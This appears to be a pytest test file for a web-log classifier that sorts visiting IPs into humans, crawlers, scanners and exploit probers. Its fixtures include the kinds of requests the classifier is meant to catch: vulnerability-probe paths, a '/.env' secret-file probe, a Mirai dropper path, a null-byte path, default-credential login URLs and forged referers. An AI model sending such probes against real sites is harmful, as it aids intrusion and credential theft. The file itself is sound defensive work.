def test_encoded_null_byte_is_still_an_exploit(tmp_db):
    with get_conn(tmp_db) as conn:
        _visit(conn, "30.0.0.3", path="/index.html%00.jpg")
        _intel(conn, "30.0.0.3")
    with get_conn(tmp_db) as conn:
        assert classify_ip(conn, "30.0.0.3") == "threats/exploit-probers"


def test_mirai_dropper_path_is_an_exploit(tmp_db):
    """The %00 bug was the only thing catching these; fixing it needed a real rule."""
    with get_conn(tmp_db) as conn:
        _visit(conn, "30.0.0.4", path="/010100110101010/fghe3tj.arm", status=404)
        _intel(conn, "30.0.0.4")
    with get_conn(tmp_db) as conn:
        assert classify_ip(conn, "30.0.0.4") == "threats/exploit-probers"


@pytest.mark.parametrize(
    "path",
    [
        "/boaform/admin/formLogin?username=admin&psd=admin",
        "/HNAP1/",
        "/wp-login.php",
        "/geoserver/web/",
        "/mcp",
        "/index.php",
        "/admin",
    ],
)
def test_probe_paths_added_in_v3(tmp_db, path):
    with get_conn(tmp_db) as conn:
        _visit(conn, "31.0.0.1", path=path, status=404)
        _intel(conn, "31.0.0.1")
    with get_conn(tmp_db) as conn:
        assert classify_ip(conn, "31.0.0.1") == "bots/vulnerability-probers"


def test_port80_redirects_do_not_dilute_the_error_rate(tmp_db):
    """Half of all traffic is the HTTP->HTTPS redirect. Counting it as a request
    halved every 404 ratio and hid low-volume scanners."""
    with get_conn(tmp_db) as conn:
        for _ in range(8):
            _visit(conn, "32.0.0.1", path="/", status=301, server_port=80)
        for i in range(3):
            _visit(conn, "32.0.0.1", path=f"/missing-{i}", status=404, server_port=443)
        _intel(conn, "32.0.0.1")
    with get_conn(tmp_db) as conn:
        assert classify_ip(conn, "32.0.0.1") == "bots/vulnerability-probers"


def test_convention_file_404s_do_not_make_a_prober(tmp_db):
    """security.txt is RFC 9116, ads.txt an IAB standard, llms.txt an AI convention.
    Asking where to report a vulnerability is good citizenship, not probing —
    counting these flagged 42 production IPs as vulnerability-probers."""
    with get_conn(tmp_db) as conn:
        _visit(conn, "32.0.0.3", path="/", status=200)
        for p in ("/.well-known/security.txt", "/ads.txt", "/llms.txt", "/robots.txt"):
            _visit(conn, "32.0.0.3", path=p, status=404)
        _intel(conn, "32.0.0.3")
    with get_conn(tmp_db) as conn:
        assert classify_ip(conn, "32.0.0.3") != "bots/vulnerability-probers"


def test_convention_files_do_not_mask_real_probing(tmp_db):
    """Excluding them must not become a way to dilute a real scan."""
    with get_conn(tmp_db) as conn:
        _visit(conn, "32.0.0.4", path="/.well-known/security.txt", status=404)
        for p in ("/aaa", "/bbb", "/ccc"):
            _visit(conn, "32.0.0.4", path=p, status=404)
        _intel(conn, "32.0.0.4")
    with get_conn(tmp_db) as conn:
        assert classify_ip(conn, "32.0.0.4") == "bots/vulnerability-probers"


def test_low_volume_404_scanner_is_a_prober(tmp_db):
    """Three distinct missing paths is probing, even below any ratio floor."""
    with get_conn(tmp_db) as conn:
        for p in ("/aaa", "/bbb", "/ccc"):
            _visit(conn, "32.0.0.2", path=p, status=404)
        _intel(conn, "32.0.0.2")
    with get_conn(tmp_db) as conn:
        assert classify_ip(conn, "32.0.0.2") == "bots/vulnerability-probers"


def test_redirect_referer_is_not_internal_navigation(tmp_db, monkeypatch):
    """Our own 301 makes the client re-request the same URL with that URL as the
    referer. 754 IPs carried this artifact; it is not navigation."""
    from src import config

    monkeypatch.setattr(config.settings, "site_base_url", "https://example.com")
    with get_conn(tmp_db) as conn:
        _visit(conn, "33.0.0.1", path="/", status=301, server_port=80)
        _human_visit(conn, "33.0.0.1", referer="http://example.com")
        _intel(conn, "33.0.0.1")
    with get_conn(tmp_db) as conn:
        assert classify_ip(conn, "33.0.0.1") == "humans/browser-direct"


def test_referer_to_a_different_page_is_internal_navigation(tmp_db, monkeypatch):
    """The legitimate half: http:// and www. hosts count when the page differs."""
    from src import config

    monkeypatch.setattr(config.settings, "site_base_url", "https://example.com")
    with get_conn(tmp_db) as conn:
        _visit(
            conn,
            "33.0.0.2",
            path="/pages/cv.html",
            sec_fetch_mode="navigate",
            sec_fetch_dest="document",
            referer="http://www.example.com/index.html",
        )
        _intel(conn, "33.0.0.2")
    with get_conn(tmp_db) as conn:
        assert classify_ip(conn, "33.0.0.2") == "humans/browser-internal-nav"


def test_js_fragment_fetch_qualifies_as_a_browser(tmp_db, configured_site):
    """Only the site's own i18n.js requests these paths, so fetching one proves a
    JS-executing browser — the one signal an HTTP/1.1 client can still give us.
    47 such IPs were sitting in 'unknown'."""
    with get_conn(tmp_db) as conn:
        _visit(conn, "34.0.0.1", path="/index.html", user_agent="Mozilla/5.0 (Windows NT 10.0)")
        _visit(conn, "34.0.0.1", path="/assets/pages/cv.html")
        _intel(conn, "34.0.0.1")
    with get_conn(tmp_db) as conn:
        assert classify_ip(conn, "34.0.0.1").startswith("humans/")


def test_js_fragment_fetch_from_cloud_is_not_a_human(tmp_db, configured_site):
    """421 datacenter IPs fetch the same fragments — headless crawlers running our JS."""
    with get_conn(tmp_db) as conn:
        _visit(conn, "34.0.0.2", path="/assets/pages/cv.html")
        _intel(conn, "34.0.0.2", is_hosting=1)
    with get_conn(tmp_db) as conn:
        assert classify_ip(conn, "34.0.0.2") == "automated/datacenter"


def test_http_client_library_is_not_a_generic_bot(tmp_db):
    with get_conn(tmp_db) as conn:
        _visit(conn, "35.0.0.1", path="/", user_agent="curl/7.88.1")
        _intel(conn, "35.0.0.1")
    with get_conn(tmp_db) as conn:
        assert classify_ip(conn, "35.0.0.1") == "automated/http-clients"


def test_self_declared_bot_stays_a_generic_bot(tmp_db):
    with get_conn(tmp_db) as conn:
        _visit(
            conn,
            "35.0.0.2",
            path="/",
            device="Bot",
            user_agent="FlowIQLabsBot/1.0 (+https://flowiq.example)",
        )
        _intel(conn, "35.0.0.2")
    with get_conn(tmp_db) as conn:
        assert classify_ip(conn, "35.0.0.2") == "bots/generic-bots"


# ── Freshness ─────────────────────────────────────────────────────────────────


def test_reclassify_stale_ips_follows_changed_behaviour(tmp_db):
    """A class summarises an IP's whole history, so it decays. Measured: 242 IPs
    carried a label their own later traffic contradicted."""
    from src.queries import reclassify_stale_ips

    with get_conn(tmp_db) as conn:
        _visit(conn, "36.0.0.1", path="/")
        _intel(conn, "36.0.0.1")
        set_visitor_class(conn, "36.0.0.1", classify_ip(conn, "36.0.0.1"))

    with get_conn(tmp_db) as conn:
        before = conn.execute(
            "SELECT visitor_class FROM ip_intel WHERE ip = ?", ("36.0.0.1",)
        ).fetchone()[0]
        assert before == "unknown"
        # The same IP starts probing after it was judged harmless.
        _visit(conn, "36.0.0.1", path="/wp-admin/", status=404)

    with get_conn(tmp_db) as conn:
        assert reclassify_stale_ips(conn) == 1
        after = conn.execute(
            "SELECT visitor_class FROM ip_intel WHERE ip = ?", ("36.0.0.1",)
        ).fetchone()[0]
        assert after == "bots/vulnerability-probers"


def test_reclassify_stale_ips_leaves_settled_labels_alone(tmp_db):
    from src.queries import reclassify_stale_ips

    with get_conn(tmp_db) as conn:
        _visit(conn, "36.0.0.2", path="/")
        _intel(conn, "36.0.0.2")
        set_visitor_class(conn, "36.0.0.2", classify_ip(conn, "36.0.0.2"))
    with get_conn(tmp_db) as conn:
        assert reclassify_stale_ips(conn) == 0


# ── Evidence mirror ───────────────────────────────────────────────────────────


def _signal_dicts():
    """Signal dicts covering every branch of the priority chain, plus combinations
    where a later rule would win if an earlier one were dropped."""
    base = {
        "total": 10,
        "content_requests": 10,
        "all_uas_lower": "",
        "reverse_dns": "",
        "tags": "",
        "payload_abuse": 0,
        "protocol_mismatch": 0,
        "exploit_probes": 0,
        "scanner_paths": 0,
        "browser_navigate": 0,
        "js_fetch": 0,
        "has_zstd": 0,
        "http2_visits": 0,
        "err404": 0,
        "probe_404": 0,
        "bad_requests": 0,
        "distinct_404_paths": 0,
        "bot_device": 0,
        "internal_nav": 0,
        "cross_site_nav": 0,
        "unique_paths": 1,
        "is_hosting": 0,
        "is_proxy": 0,
        "is_tor": 0,
        "dnsbl_listed": 0,
    }
    variants = [
        {},
        {"payload_abuse": 3},
        {"protocol_mismatch": 4},
        {"payload_abuse": 1, "protocol_mismatch": 4},  # payload outranks mismatch
        {"exploit_probes": 2},
        {"scanner_paths": 5},
        {"err404": 8, "probe_404": 8},
        {"err404": 1, "probe_404": 1},
        {"distinct_404_paths": 3},
        {"reverse_dns": "scan.censys.io"},
        {"all_uas_lower": "zgrab/0.x"},
        {"all_uas_lower": "censysinspect/1.1 zgrab/0.x"},  # named org beats tool
        {"all_uas_lower": "hello from palo alto networks"},
        {"tags": "scanner,cloud"},  # reputation must not decide identity
        {"reverse_dns": "crawl.googlebot.com"},
        {"all_uas_lower": "bingbot/2.0"},
        {"all_uas_lower": "googlebot/2.1", "is_hosting": 1},  # unconfirmed claim
        {"all_uas_lower": "seznambot/4.0"},
        {"all_uas_lower": "gptbot/1.0"},
        {"all_uas_lower": "gptbot/1.0", "is_hosting": 1},
        {"reverse_dns": "bot.anthropic.com", "is_hosting": 1},
        {"all_uas_lower": "ahrefsbot/7.0"},
        {"all_uas_lower": "screaming frog seo spider"},
        {"browser_navigate": 4},
        {"browser_navigate": 4, "cross_site_nav": 2},
        {"browser_navigate": 4, "internal_nav": 3},
        {"browser_navigate": 4, "is_hosting": 1},  # headless browser
        {"browser_navigate": 4, "is_hosting": 1, "is_proxy": 1},  # proxy is no exemption
        {"browser_navigate": 4, "is_proxy": 1},  # proxy without hosting stays human
        {"browser_navigate": 4, "bot_device": 1},  # bot UA disqualifies
        {"browser_navigate": 4, "protocol_mismatch": 2},  # protocol errors disqualify
        {"browser_navigate": 4, "bad_requests": 5},  # malformed requests disqualify
        {"js_fetch": 3},
        {"js_fetch": 3, "is_hosting": 1},  # JS evidence does not survive the cloud
        {"js_fetch": 3, "bot_device": 1},
        {"has_zstd": 1, "unique_paths": 3},
        {"has_zstd": 1, "unique_paths": 1},
        {"http2_visits": 2, "unique_paths": 5},
        {"all_uas_lower": "curl/7.88.1"},
        {"all_uas_lower": "go-http-client/1.1", "bot_device": 1},  # library beats bot
        {"bot_device": 1},
        {"is_hosting": 1},
        {"is_hosting": 1, "bot_device": 1},
        {"scanner_paths": 1, "browser_navigate": 9},  # behaviour outranks browser-look
        {"is_tor": 1, "browser_navigate": 4},  # reputation never downgrades a human
        {"total": 3, "content_requests": 3, "err404": 3, "probe_404": 3},
        # All requests were port-80 redirects: no content, so no error ratio.
        {"total": 8, "content_requests": 0, "err404": 0},
    ]
    return [{**base, **v} for v in variants]


@pytest.mark.parametrize("d", _signal_dicts())
def test_evidence_mirrors_the_priority_chain(d):
    """_decisive_rule must derive the same label as _apply_priority_chain.

    explain_classification() re-walks the chain to say *why*; if the two ever
    disagree, the detail page would justify a class the IP does not have.
    """
    from src.queries import _apply_priority_chain, _decisive_rule

    assert _decisive_rule(d)[0] == _apply_priority_chain(d)


def test_explain_classification_reports_decision_and_context(tmp_db):
    """The deciding rule comes first; orthogonal signals follow as context."""
    from src.queries import explain_classification

    with get_conn(tmp_db) as conn:
        _visit(conn, "45.1.1.1", path="/.env", status=404)
        _intel(conn, "45.1.1.1", is_hosting=1, dnsbl_listed=1, dnsbl_sources="zen.spamhaus.org")
    with get_conn(tmp_db) as conn:
        ev = explain_classification(conn, "45.1.1.1")

    assert ev[0]["decisive"] is True
    assert "probe path" in ev[0]["text"]
    assert ev[0]["source"] == "behaviour"
    rest = " ".join(e["text"] for e in ev[1:])
    assert "zen.spamhaus.org" in rest
    assert "Hosting/cloud" in rest
    assert all(e["decisive"] is False for e in ev[1:])


def test_explain_classification_unknown_ip_is_empty(tmp_db):
    from src.queries import explain_classification

    with get_conn(tmp_db) as conn:
        assert explain_classification(conn, "203.0.113.99") == []


def test_forged_referer_is_not_internal_navigation(tmp_db, configured_site):
    """A bare '%host%' match would let any site claim to be us by putting our domain
    in a query string or a subdomain suffix."""
    for ip, referer in (
        ("37.0.0.1", "https://evil.example/?next=example.com/index.html"),
        ("37.0.0.2", "https://example.com.evil.example/index.html"),
    ):
        with get_conn(tmp_db) as conn:
            _visit(
                conn,
                ip,
                path="/assets/pages/cv.html",
                sec_fetch_mode="navigate",
                sec_fetch_dest="document",
                referer=referer,
            )
            _intel(conn, ip)
        with get_conn(tmp_db) as conn:
            assert classify_ip(conn, ip) == "humans/browser-direct", referer


# ── Browser-gate disqualifiers (v3.1) ─────────────────────────────────────────
# Each of these was measured letting non-humans into humans/* on a live log.


def test_bot_ua_cannot_be_human(tmp_db):
    """A crawler UA with weak transport signals passed the gate because bot_device was
    only checked *after* it. Production example: 'GenomeCrawlerd 1.0' labelled human."""
    with get_conn(tmp_db) as conn:
        _visit(
            conn,
            "40.0.0.1",
            path="/",
            device="Bot",
            user_agent="GenomeCrawlerd 1.0",
            http_version="HTTP/2.0",
        )
        _visit(
            conn,
            "40.0.0.1",
            path="/index.html",
            device="Bot",
            user_agent="GenomeCrawlerd 1.0",
            http_version="HTTP/2.0",
        )
        _intel(conn, "40.0.0.1")
    with get_conn(tmp_db) as conn:
        assert classify_ip(conn, "40.0.0.1") == "bots/generic-bots"


def test_protocol_errors_disqualify_the_browser_gate(tmp_db):
    """A browsing person does not emit TLS handshakes on the plain-HTTP port."""
    with get_conn(tmp_db) as conn:
        _human_visit(conn, "40.0.0.2")
        _visit(conn, "40.0.0.2", path="[handshake on HTTP port]", method="TLS", status=400)
        _intel(conn, "40.0.0.2")
    with get_conn(tmp_db) as conn:
        assert classify_ip(conn, "40.0.0.2") == "automated/protocol-mismatch"


def test_pseudo_paths_do_not_count_as_pages(tmp_db):
    """'[handshake on HTTP port]' + '/' used to satisfy the 'explored >= 2 pages'
    test, which is how weak transport signals alone produced a human."""
    from src.config import settings
    from src.queries import _classify_params, _classify_sql

    with get_conn(tmp_db) as conn:
        _visit(conn, "40.0.0.3", path="/", http_version="HTTP/2.0")
        _visit(conn, "40.0.0.3", path="[binary payload]", method="NON-HTTP")
        _intel(conn, "40.0.0.3")
    with get_conn(tmp_db) as conn:
        row = conn.execute(
            _classify_sql(tuple(settings.js_only_path_prefixes)), _classify_params("40.0.0.3")
        ).fetchone()
        assert row["unique_paths"] == 1


def test_a_js_prefix_matches_as_a_path_and_not_as_a_pattern(tmp_db, monkeypatch):
    """JS_ONLY_PATH_PREFIXES is operator input and used to be interpolated into
    the LIKE clause, so `%` matched every request and handed js_fetch — one of
    the two strong browser signals — to all of them."""
    from src.config import settings
    from src.queries import _classify_params, _classify_sql

    with get_conn(tmp_db) as conn:
        for path in ("/a_b/x", "/axb/x", "/it's/x", "/", "/wp-login.php"):
            _visit(conn, "40.0.0.9", path=path)
        _intel(conn, "40.0.0.9")

    def js_fetch(*prefixes):
        monkeypatch.setattr(settings, "js_only_path_prefixes", list(prefixes))
        with get_conn(tmp_db) as conn:
            return conn.execute(
                _classify_sql(tuple(prefixes)), _classify_params("40.0.0.9")
            ).fetchone()["js_fetch"]

    assert js_fetch("%") == 0, "a wildcard prefix must match nothing, not everything"
    assert js_fetch("/a_b/") == 1, "the underscore is a path character, not a single-char match"
    assert js_fetch("/it's/") == 1, "the apostrophe belongs to the path"
    assert js_fetch() == 0


@pytest.mark.parametrize("redirect_status", [301, 308], ids=["moved", "permanent-redirect"])
def test_a_port_80_redirect_is_not_a_content_request(tmp_db, redirect_status):
    """Which permanent redirect nginx answers on port 80 is the operator's
    choice, and it used to decide the denominator every error ratio is built on:
    301 was excluded, 308 counted as a request that reached the site."""
    from src.config import settings
    from src.queries import _classify_params, _classify_sql

    with get_conn(tmp_db) as conn:
        for _ in range(4):
            _visit(conn, "40.0.0.8", path="/", status=redirect_status, server_port=80)
        _visit(conn, "40.0.0.8", path="/", status=200, server_port=443)
        _intel(conn, "40.0.0.8")

    with get_conn(tmp_db) as conn:
        row = conn.execute(
            _classify_sql(tuple(settings.js_only_path_prefixes)), _classify_params("40.0.0.8")
        ).fetchone()
    assert row["total"] == 5
    assert row["content_requests"] == 1


def test_malformed_request_rate_disqualifies(tmp_db):
    """400s are tooling, not browsing."""
    with get_conn(tmp_db) as conn:
        _human_visit(conn, "40.0.0.4")
        for _ in range(3):
            _visit(conn, "40.0.0.4", path="/", status=400)
        _intel(conn, "40.0.0.4")
    with get_conn(tmp_db) as conn:
        assert not classify_ip(conn, "40.0.0.4").startswith("humans/")


def test_cloud_isp_name_supplements_the_hosting_flag(tmp_db):
    """ip-api did not flag Akamai (which carries Linode's VPS ranges) as hosting, so
    21 rented boxes sat in humans/* with full browser signals."""
    with get_conn(tmp_db) as conn:
        _human_visit(conn, "41.0.0.1")
        _intel(conn, "41.0.0.1", isp="Akamai Technologies, Inc.")
    with get_conn(tmp_db) as conn:
        assert classify_ip(conn, "41.0.0.1") == "automated/headless-browser"


def test_cloudflare_warp_users_stay_human(tmp_db):
    """Cloudflare is deliberately not in the cloud-ISP list: its ranges carry WARP, a
    consumer VPN. All 32 Cloudflare IPs in the human cohort were proxy-flagged and
    fetched the JS-only fragments — people, not rented boxes."""
    with get_conn(tmp_db) as conn:
        _human_visit(conn, "41.0.0.2")
        _intel(conn, "41.0.0.2", isp="Cloudflare, Inc.", is_proxy=1)
    with get_conn(tmp_db) as conn:
        assert classify_ip(conn, "41.0.0.2") == "humans/browser-direct"
